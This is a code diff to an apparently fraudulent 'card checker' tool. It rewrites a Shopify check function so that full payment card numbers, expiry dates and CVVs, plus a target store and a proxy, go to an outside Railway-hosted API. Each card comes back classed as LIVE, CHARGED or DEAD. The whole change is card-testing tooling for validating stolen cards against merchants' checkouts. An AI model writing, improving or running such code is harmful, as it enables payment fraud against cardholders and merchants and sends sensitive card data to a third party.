@@ -164,24 +164,68 @@ class CffiClientSession:
         return False
 
 
+import urllib.parse
 async def shopify_check(
     card: Card,
     store_url: str,
     proxy: Optional[str] = None,
-    timeout: int = 20,
+    timeout: int = 45,
     max_retries: int = 1,
 ) -> CheckResult:
-    """Run a single Shopify card check using advanced GraphQL flow."""
-    for attempt in range(max_retries + 1):
-        result = await _do_shopify_check(card, store_url, proxy, timeout)
-        is_network_error = any(kw in result.message for kw in ("timeout", "dns_error", "proxy_error:", "ssl_error", "connection_error:", "session_init_failed"))
-        if is_network_error and attempt < max_retries:
-            logger.debug("Retry %d/%d for %s", attempt + 1, max_retries, store_url)
-            await asyncio.sleep(1)
-            continue
-        return result
-    return result
+    import aiohttp
+    
+    api_url = "https://cozy-abundance-production-88ca.up.railway.app/shopify"
+    
+    # We pass the proxy via the query parameters, as the API expects it
+    params = {
+        "site": store_url,
+        "cc": f"{card.number}|{card.month}|{card.year}|{card.cvv}"
+    }
+    if proxy:
+        params["proxy"] = proxy
 
+    # Let's extract numeric price from "$37.5 [Min Prod:..."
+    def extract_price(price_str):
+        try:
+            import re
+            m = re.search(r'\$?([0-9.]+)', price_str)
+            if m:
+                return float(m.group(1))
+        except:
+            pass
+        return 0.0
+
+    async with aiohttp.ClientSession() as session:
+        for attempt in range(max_retries + 1):
+            try:
+                # Use a larger timeout for the external API to finish
+                api_timeout = aiohttp.ClientTimeout(total=timeout)
+                async with session.get(api_url, params=params, timeout=api_timeout) as r:
+                    if r.status == 200:
+                        data = await r.json()
+                        status = data.get("Status", "DEAD").upper()
+                        msg = data.get("Response", "unknown_error")
+                        gw = data.get("Gateway", "Shopify Payments")
+                        price = extract_price(data.get("Price", "0.0"))
+                        
+                        # Normalize statuses
+                        if "DEAD" in status: status = "DEAD"
+                        elif "LIVE" in status: status = "LIVE"
+                        elif "CHARGED" in status: status = "CHARGED"
+                        elif "SITE_ERROR" in status:
+                            status = "DEAD"
+                            msg = f"site_error: {msg}"
+                            
+                        return CheckResult(status, msg, gw, price, store_url, card)
+                    else:
+                        logger.debug("External API error %s: %s", r.status, await r.text())
+            except Exception as e:
+                logger.debug("External API exception: %s", e)
+                
+            if attempt < max_retries:
+                await asyncio.sleep(1)
+                
+    return CheckResult("DEAD", "api_timeout", "Shopify Payments", 0.0, store_url, card)
 
 async def _do_shopify_check(
     card: Card,
